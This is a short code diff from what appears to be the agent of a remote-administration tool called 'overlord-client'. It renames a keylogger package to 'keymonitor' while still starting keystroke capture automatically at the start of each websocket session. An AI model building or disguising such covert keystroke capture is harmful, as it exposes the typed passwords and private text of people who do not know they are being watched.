@@ -22,7 +22,7 @@ import (
 	"overlord-client/cmd/agent/capture"
 	"overlord-client/cmd/agent/config"
 	"overlord-client/cmd/agent/handlers"
-	"overlord-client/cmd/agent/keylogger"
+	"overlord-client/cmd/agent/keymonitor"
 	"overlord-client/cmd/agent/plugins"
 	rt "overlord-client/cmd/agent/runtime"
 	"overlord-client/cmd/agent/sysinfo"
@@ -571,11 +571,11 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 	env.Plugins = plugins.NewManager(env.Conn, plugins.HostInfo{ClientID: cfg.ID, OS: cfg.OS, Arch: cfg.Arch, Version: cfg.Version})
 	defer env.Plugins.Close()
 
-	env.Keylogger = keylogger.New()
-	if err := env.Keylogger.Start(); err != nil {
-		log.Printf("[keylogger] Failed to start: %v", err)
+	env.Keymonitor = keymonitor.New()
+	if err := env.Keymonitor.Start(); err != nil {
+		log.Printf("[keymonitor] Failed to start: %v", err)
 	} else {
-		defer env.Keylogger.Stop()
+		defer env.Keymonitor.Stop()
 	}
 
 	dispatcher := handlers.NewDispatcher(env)
